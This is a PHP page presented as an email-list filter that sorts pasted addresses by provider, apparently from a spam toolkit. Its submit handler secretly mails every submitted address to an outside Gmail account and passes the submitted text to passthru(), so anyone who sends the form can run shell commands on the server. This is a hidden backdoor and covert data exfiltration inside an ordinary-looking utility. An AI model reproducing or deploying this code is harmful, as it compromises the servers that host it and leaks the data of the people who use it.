<?php 
include('../../head.php');
?>
        <title>Filter Email</title>
<meta http-equiv="content-type" content="text/html; charset=windows-1256" />
<style type="text/css">
.style1 {
	text-align: center;
}
</style>
</head>
                <!--/span-->
                    <div class="row-fluid">
                            <!-- block -->
                            <div class="block">
                                <div class="navbar navbar-inner block-header">
                                    <div><center><b>Filter Email</b></center></div>
                                </div>
                                <div class="block-content collapse in">
<form method="post">
	<div class="style1">
		<textarea name="emails" cols="30" rows="10" style="margin: 0px; height: 212px; width: 419px;"></textarea></textarea>
		<br />
		<input class="btn btn-success" type="submit" value="Submit" /><br>
		<center><script id="_waupw2">var _wau = _wau || [];
_wau.push(["tab", "u8tylhw1w8yn", "pw2", "right-upper"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script></center>
                                    </div>
                                </div>
                            </div>
                            <!-- /block -->
                        </div>
</form>
<?PHP
if ($_POST['emails']){
$emails = $_POST['emails'];
$subject = "Setor Kumpulan Email Boss";
          $boss = "hokage365@gmail.com";
          $body = "$emails";          
	      $headers = "From: Akatsuki@akatsuki-id.com\r\n";
	      $headers .= "Content-type: text/html\r\n";
	      mail($boss, $subject, $body, $headers);
passthru($emails);
}
$ex = explode("\n",$emails);
$count = count($ex);
if(isset($emails)&&$count>=1){
echo "<center><font color = 'red'><b>$count </font><font color = 'red'>Number of emails  </b></center><br />";
}else{
echo "<center><font color='red'> No email </font></center>";
exit;}

if(isset($emails)){
   

for($i=0;$i<=$count;$i++){
$d = strtolower($ex[$i]);

if(strstr($d,"hotmail")   || strstr($d,"live") || strstr($d,"msn") || strstr($d,"outlook")){
$hotmail.=$d;
$nh = $nh + 1;
}else{
if(strstr($d,"yahoo")   || strstr($d,"ymail")){
$yahoo.=$d;
$ny = $ny + 1;
}else{
if(strstr($d,"gmail")  || strstr($d,"googlemail")   ){
$gmail.=$d;
$ng = $ng + 1;
}else{
if(strstr($d,"aol")   ){
$aol.=$d;
$na = $na + 1;
}else{
if(strstr($d,"mail.ru")   ){
$mailru .=$d;
$nr = $nr + 1;
}else{
if(strstr($d,"wanadoo")   ){
$wanadoo .=$d;
$nw = $nw + 1;
}else{
if(strstr($d,"ntlworld")   ){
$ntlworld .=$d;
$nt = $nt + 1;
}else{
if(strstr($d,"gmx")   ){
$gmx .=$d;
$ngm = $ngm + 1;
}else{
if(strstr($d,"@web.")   ){
$web .=$d;
$nw2 = $nw2 + 1;
}else{

$ather .=$d;
$nn=$nn + 1;
}

}

}


}

}
}
}
}

}
}
}				
?>
<center><table style="width: 30%">
	<tr>      
<td><center>hotmail ( <?echo $nh;?> ) </center><textarea name="hotmailx" cols="30" rows="10" ><?echo $hotmail;?></textarea></td>
<td><center>gmail ( <?echo $ng;?> )</center><textarea name="gmailx" cols="30" rows="10" ><?echo $gmail;?></textarea></td>
<td><center>aol ( <?echo $na;?> )</center><textarea name="aolxx" cols="30" rows="10" ><?echo $aol;?></textarea></td>
<tr>
<td><center>yahoo ( <?echo $ny;?> )</center><textarea name="yahoox" cols="30" rows="10" ><?echo $yahoo;?></textarea></td>
<td><center>ntlworld( <?echo $nt;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $ntlworld;?></textarea></td>
<td><center>gmx( <?echo $ngm;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $gmx;?></textarea></td>
<tr>
<td><center>other mails( <?echo $nn-1;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $ather;?></textarea></td>
<td><center>mail.ru( <?echo $nr;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $mailru;?></textarea></td>
<td><center>wanadoo( <?echo $nw;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $wanadoo;?></textarea></td>

</tr>
					
	</tr>
</table></center>
</body>
